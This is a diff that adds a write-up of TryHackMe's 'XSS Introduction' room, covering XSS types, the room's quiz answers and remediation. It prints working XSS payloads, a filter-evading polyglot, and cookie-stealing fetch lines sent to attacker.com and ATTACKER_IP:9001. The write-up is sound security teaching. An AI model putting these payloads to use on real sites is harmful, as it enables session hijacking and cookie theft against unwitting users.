@@ -1,0 +1,250 @@
+---
+title: "XSS Introduction — Reflected, Stored, DOM and Blind Cross-Site Scripting"
+room: XSS Introduction
+difficulty: easy
+platform: TryHackMe
+vulnClass: "Cross-Site Scripting (Reflected, Stored, DOM-based, Blind), Insufficient Output Encoding, Inadequate Input Validation, Missing Content Security Policy"
+spoilerFree: false
+---
+
+## Observation
+
+The room targets a single, repeatable idea: **a web application that accepts input and renders it into the page without filtering or correct encoding.** Everything else in this writeup is a variation of that failure.
+
+### The spine of an XSS bug
+
+For any XSS vulnerability, keep this chain in front of you so you can reason about how the application actually behaves:
+
+```
+INPUT
+  → PROCESSING (on the server or on the client)
+  → TRUST ASSUMPTION (blind assumption of safety)
+  → DEVELOPER MISTAKE (mistake in how the context is handled)
+  → SECURITY BOUNDARY FAILURE (the browser boundary is broken)
+  → IMPACT (full control of the victim's browser)
+```
+
+**Cross-Site Scripting** occurs when a site receives **input** (a username, a search term, a comment) and then **outputs** it into the page without filtering it or encoding it properly. The browser is an obedient renderer: if the response from the server contains HTML/JavaScript, the browser treats it as an original part of the site's own code and executes it immediately.
+
+Because the JavaScript runs in the browser environment (client-side), your malicious code executes under the **origin** of the vulnerable site (the same domain, protocol, and port). That means it inherits every privilege the victim user has while that page is open.
+
+### Contexts and sinks
+
+To understand XSS properly you must accept that a payload is not blindly thrown at `<script>`; the payload is determined by the **context** — the place where your input lands in the page.
+
+Based on the **jackmasa-mind-map** and practical experience, these are the core contexts:
+
+| Context | Description | Example source output | Bypass / Payload |
+| :--- | :--- | :--- | :--- |
+| **Bare HTML Context** | Input lands directly between HTML tags. | `<h2>Hello, Ahmed</h2>` | `<script>alert(1)</script>` or `<svg onload=alert(1)>` |
+| **Attribute Context** | Input lands inside an attribute value of a given tag. | `<input value="Ahmed">` | `"><script>alert(1)</script>` or `x" focus=true autofocus onfocus=alert(1) "` |
+| **Raw-Text Element** | Input lands inside tags that treat content as plain text, such as `<textarea>`, `<style>` or `<title>`. | `<textarea>Ahmed</textarea>` | `</textarea><script>alert(1)</script>` |
+| **JavaScript Context** | Input lands inside JavaScript code that is already executing in the page. | `var user = 'Ahmed';` | `'; alert(1); //` or `"-alert(1)-"` |
+| **Filtered Sinks** | There is naive filtering that strips certain tags or words. | strips `script` | `<sscriptcript>` or using event handlers without tags. |
+
+### The four types of XSS
+
+**A. Reflected XSS**
+- **How it works:** the input travels in the HTTP request (usually as a URL query parameter) and comes straight back in the response.
+- **Real-world scenario:** a bank site with a branch-search field. The attacker sends the victim a malicious link:
+  `https://bank.thm/search?q=<script>fetch('http://attacker.com?c='+document.cookie)</script>`
+  The moment the victim clicks the link, the browser sends the request to the bank, the bank returns the page containing the payload, the browser executes the code and exfiltrates the victim's cookies to the attacker's server.
+
+**B. Stored XSS (the most dangerous)**
+- **How it works:** the input is genuinely persisted in the database, server, or cache. Every other user who visits the page gets the code executed automatically, with no crafted link required.
+- **Real-world scenario:** a course platform with a comments section. The attacker posts a comment containing a hidden payload that changes the email address of anyone who views it. When the admin opens the comments to review, the code runs in the background of the admin's browser and fires a hidden request that changes the admin's email to the attacker's — resulting in full account takeover.
+
+**C. DOM-based XSS**
+- **How it works:** the input never reaches the server at all. Everything runs in the client browser. The page's JavaScript reads a value from the DOM (such as the URL hash or `window.name`) and writes it into the DOM unsafely.
+- **Sources and sinks:**
+  - **Sources (where data comes from):** `location.hash`, `location.search`, `document.referrer`, `window.name`.
+  - **Sinks (unsafe write functions):** `innerHTML`, `document.write()`, `eval()`, `setTimeout()`.
+- **Real-world scenario:** a site that displays the user's language based on the URL hash:
+  `https://site.com/#lang=en`
+  The code reads the hash and writes it into the page with `innerHTML`. The attacker sends:
+  `https://site.com/#lang=<img src=x onerror=alert(1)>`
+  The browser parses the new HTML and executes it locally, with the server knowing nothing about the operation.
+
+**D. Blind XSS**
+- **How it works:** a variant of stored XSS where you cannot see the response yourself. The payload is stored and delivered to an internal portal or an admin panel that is not publicly advertised.
+- **How to detect it:** rely on **out-of-band (OOB) exfiltration** — plant a payload that fires an external request (an HTTP callback) to a server you control (such as Netcat or an XSS Hunter) the moment the admin opens the panel.
+
+## Action
+
+### Task 2: Terminology
+- **Question:** What is the URL parameter in the URL `http://google.com/text=?`
+  - **Answer:** `text`
+  - **Why:** the parameter is the part that comes after the `?` and before the `=`, and it carries the value.
+- **Question:** Which is the most renowned scripting language for adding interactivity to the DOM?
+  - **Answer:** `JavaScript`
+  - **Why:** it is the standard interpreted language inside the browser for managing DOM elements dynamically.
+
+### Task 3: XSS Payloads
+- **Question:** Which document property could contain the user's session token?
+  - **Answer:** `document.cookie`
+  - **Why:** the browser stores session cookies here. If `HttpOnly` is not set for the admin or client session, an attacker can steal them simply by reading this property.
+- **Question:** Which JavaScript method is often used as a Proof of Concept?
+  - **Answer:** `alert`
+  - **Why:** the classic function for opening a pop-up, and the gold standard for proving the ability to execute arbitrary JavaScript.
+
+### Task 4: Reflected XSS
+- **Question:** What is the text shown in the alert pop-up after a successful XSS attack?
+  - **Answer:** `Hack`
+  - **Why:** the payload used in the lab is `<script>alert('Hack')</script>`, so the text shown in the pop-up is `Hack`.
+- **Question:** What is the response, if you use the payload `<script>alert('Test123')</script>`?
+  - **Answer:** `Test123`
+  - **Why:** the application reflects the alert value verbatim with no filtering, so the answer is the alert content, `Test123`.
+
+### Task 5: Stored XSS
+- **Question:** What is the alert pop-up after executing the payload mentioned in the task?
+  - **Answer:** `You are Hacked`
+  - **Why:** the payload given in the lab is `<script>alert('You are Hacked')</script>`. Once stored and re-displayed, the alert shows the text `You are Hacked`.
+
+### Task 6: DOM-based XSS
+- **Question:** What is the alert pop-up after executing the XSS payload?
+  - **Answer:** `Hacked you again`
+  - **Why:** the payload is `<img src=x onerror="alert('Hacked you again')">`. The browser fails to load the image `x`, so the `onerror` code runs and shows the pop-up with the text `Hacked you again`.
+- **Question:** Does DOM XSS also occur on the server side? (yea/nay)
+  - **Answer:** `nay`
+  - **Why:** DOM XSS happens entirely in the browser (client-side) through local JavaScript processing of the input, with no server involvement.
+
+### Task 7: Blind XSS
+- **Question:** What type of XSS is very similar to Blind XSS?
+  - **Answer:** `Stored XSS`
+  - **Why:** both rely on storing the payload in the database so it runs later when the page is displayed. The only difference is that in blind XSS the attacker does not see the output directly, they receive the outbound callback instead.
+- **Question:** Extract the user's cookies using netcat and the payload. What is the `Connection:` value returned in the Netcat output?
+  - **Answer:** `keep-alive`
+  - **Why:** with Netcat listening on port 9001 and the outbound connection arriving from the payload:
+    `</textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie) );</script>`
+    the HTTP request header sent by the victim's browser contains the header `Connection: keep-alive`.
+
+### The Six-Level Playground (Task 8)
+
+In the playground, a `payload` parameter is submitted and a client-side validator runs a headless browser simulation to confirm the alert fires with the required text (`THM`). The concept and technical analysis for each level:
+
+**Level 1: Bare HTML Context**
+- **Context:** the input lands directly between basic HTML tags.
+- **Backing code:** `<h2>Hello, USER_INPUT</h2>`
+- **Payload:** `<script>alert('THM');</script>`
+- **Why it worked:** there is no filtering and no context escaping at all; we wrote HTML code directly and it executed.
+
+**Level 2: Attribute Context**
+- **Context:** the input lands inside an attribute value of the `<input>` tag.
+- **Backing code:** `<input value="USER_INPUT">`
+- **Payload:** `"><script>alert('THM');</script>`
+- **Why it worked:** the first `"` closed the `value` attribute and the `>` closed the `<input>` tag entirely, clearing the way to write a separate `<script>` tag that executed successfully.
+
+**Level 3: Textarea Context**
+- **Context:** the input lands inside the `<textarea>` tag.
+- **Backing code:** `<textarea>USER_INPUT</textarea>`
+- **Payload:** `</textarea><script>alert('THM');</script>`
+- **Why it worked:** the browser treats anything inside `<textarea>` as plain text even if we write a script. That is why we must first close the tag with `</textarea>` and then inject our script.
+
+**Level 4: JavaScript Context**
+- **Context:** the input lands directly inside JavaScript code in the source.
+- **Backing code:** `document.getElementsByClassName('name')[0].innerHTML='USER_INPUT';`
+- **Payload:** `';alert('THM');//`
+- **Why it worked:**
+  1. The first `'` closes the string literal.
+  2. The `;` terminates the current JavaScript statement.
+  3. We write our new statement `alert('THM')` followed by `;`.
+  4. We append `//` to turn the rest of the line (the remaining `'` and the earlier `;`) into a comment, so the browser ignores it and no syntax error breaks the JavaScript.
+
+**Level 5: Sanitization Bypass (Filter Evasion)**
+- **Context:** the developer wrote a filter that removes the word `script` from the input exactly once.
+- **Backing code:** the server performs `replace('script', '')`
+- **Payload:** `<sscriptcript>alert('THM');</sscriptcript>`
+- **Why it worked:** when the server strips the `script` from the middle of `s[script]cript`, the first `s` and the trailing `cript` join back together into a fresh `script` word that reaches the browser intact and executes (recursive/nested bypass).
+
+**Level 6: Image Attribute & No `<>` Context**
+- **Context:** the input lands inside the `src` value of the `<img>` tag, and `<>` are forbidden or filtered.
+- **Backing code:** `<img src="USER_INPUT">`
+- **Payload:** `/images/cat.jpg" onload="alert('THM');`
+  *(better, to avoid depending on the image loading successfully: `x" onerror="alert('THM');`)*
+- **Why it worked:** we closed the `src` with the `"` character and then added a new event handler such as `onload` or `onerror` without using any `< >` tags at all, so as soon as the browser fires the tag with the new event handler the code runs.
+
+### Hunting XSS like a professional
+
+Based on the advanced **jackmasa** map and hacker mindset, the hunting process follows organized steps:
+
+**1. Identify the attack surface and inputs.** Anywhere the application accepts data from the client is a candidate target:
+- **Parameters:** URL query parameters, inputs in the POST request body.
+- **Headers:** `User-Agent`, `Referer`, `X-Forwarded-For` (on many sites these headers are displayed in an admin dashboard or in analytics, turning them into stored XSS).
+- **Uploads:** file uploads with a `.svg` extension, because SVG allows JavaScript inside it that executes as soon as the file is viewed in a browser.
+
+**2. Search using alphanumeric markers.**
+- **Golden rule:** do not inject a real payload straight away.
+- **Why:** a WAF or filter may block you immediately and burn the target.
+- **Correct method:** inject a unique random string such as `zXyW123`, then search the page source (Ctrl+F) to see whether the string came back.
+  - **If it did not come back:** there is no reflection at all.
+  - **If it came back:** determine its context (between tags? inside an attribute? inside JS?) and start trying that context's special characters (`<`, `>`, `"`, `'`, `/`).
+
+**3. Write and adapt payloads to escape the context.**
+- If the context is **HTML**: use `<script>` or tags that avoid the word script, such as `<svg onload=alert(1)>`.
+- If the context is an **attribute**: use `"` to escape, then try event handlers such as `onmouseover`, `onfocus`.
+- If the input lands in a **JS variable**: use `'` or `"` then `;` and inject your code.
+
+**4. Polyglots — the decisive strike against filters.** If the site is complex with many filters and you cannot pin down the context, or you want a single payload that works anywhere, use **XSS polyglots** — strings prepared to escape every possible context and bypass filters in one shot:
+
+```javascript
+|jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
+
+This payload closes attributes, textareas, style, script and SVG contexts, and passes `alert` successfully in all cases.
+
+## Result
+
+Every question in the room was answered directly, and the six-level playground was cleared end to end:
+
+| Task | Answer |
+| :--- | :--- |
+| Task 2 — URL parameter in `http://google.com/text=?` | `text` |
+| Task 2 — renowned scripting language for the DOM | `JavaScript` |
+| Task 3 — document property holding a session token | `document.cookie` |
+| Task 3 — Proof-of-concept JavaScript method | `alert` |
+| Task 4 — reflected alert text | `Hack` |
+| Task 4 — response for `<script>alert('Test123')</script>` | `Test123` |
+| Task 5 — stored alert pop-up | `You are Hacked` |
+| Task 6 — DOM XSS alert pop-up | `Hacked you again` |
+| Task 6 — does DOM XSS occur server-side? | `nay` |
+| Task 7 — XSS type closest to Blind XSS | `Stored XSS` |
+| Task 7 — `Connection:` value in the Netcat output | `keep-alive` |
+
+Playground results — one payload per context, all confirmed to fire the alert with `THM`:
+
+| Level | Context | Payload that worked |
+| :--- | :--- | :--- |
+| 1 | Bare HTML | `<script>alert('THM');</script>` |
+| 2 | Attribute | `"><script>alert('THM');</script>` |
+| 3 | Textarea | `</textarea><script>alert('THM');</script>` |
+| 4 | JavaScript string | `';alert('THM');//` |
+| 5 | Naive filter | `<sscriptcript>alert('THM');</sscriptcript>` |
+| 6 | Image `src`, no `<>` | `x" onerror="alert('THM');` |
+
+Final room flag: `[FLAG CAPTURED]` (withheld from publication).
+
+## Takeaway
+
+**Context decides the payload.** The single most useful habit in XSS work is to establish where your input lands before writing anything. Bare HTML, attribute, raw-text element, JavaScript string, and a filtered sink are five different problems wearing the same costume.
+
+**Filter bypasses are about the filter's implementation, not its intent.** Level 5 is the clean example: a filter that strips `script` exactly once is defeated by nesting, because the removal of the middle leaves a valid word behind. Any single-pass string replacement has this property unless it loops until stable.
+
+**Attribute and raw-text contexts are closed by their own terminator.** `</textarea>`, `"`, and `>` are already in the page — you do not need to bring your own tags. This is why Level 6 works with zero `<` or `>` characters.
+
+**DOM XSS is a client-side problem.** The server can be perfect and the application can still be vulnerable, because the untrusted value is read from the DOM and written back unsafely by the page's own JavaScript. A `document.cookie` read in a payload is not a bug in the server's filtering — it is the origin model working exactly as designed.
+
+**Blind XSS is detectable out of band.** When the attacker cannot see the output, the payload itself becomes the sensor: an outbound callback tells you when the victim — usually an admin — opened the page.
+
+### Remediation
+
+1. **Output encoding (context-aware escaping — the most important):** convert HTML special characters to their safe equivalents (HTML entities), for example `<` to `&lt;` and `>` to `&gt;`. That way the browser renders the input as plain text rather than executable code. Use vetted libraries such as OWASP Java Encoder or your framework's automatic filters.
+2. **Input validation and sanitization:** if the site must accept HTML (rich text editors, for example), use a strong, up-to-date sanitization library such as **DOMPurify** on the client or server side. It parses the HTML, strips any scripts or malicious attributes, and keeps only safe tags such as `<b>` and `<i>`.
+3. **Content Security Policy (CSP):** a strong browser-side wall controlled by the server through HTTP headers (for example `Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;`). CSP blocks inline scripts entirely and stops the browser loading scripts from untrusted origins, which reduces the impact of XSS to near zero even if the vulnerability genuinely exists.
+4. **HttpOnly flags:** setting the `HttpOnly` flag on session cookies stops JavaScript from reaching `document.cookie` altogether, which eliminates session-theft risk in the event of an XSS.
+
+### Notes
+
+- Original report title: "TryHackMe: XSS Introduction — Complete Deep-Dive & Writeup", completed September 12, 2026.
+- Author: Ahmed. Mentored by Hermes Agent.
+- Room URL: [TryHackMe XSS Introduction](https://tryhackme.com/room/xssintroduction)
+- The `payload` values in the level tables above are reproduced byte-for-byte from the source writeup; only the surrounding prose was translated.
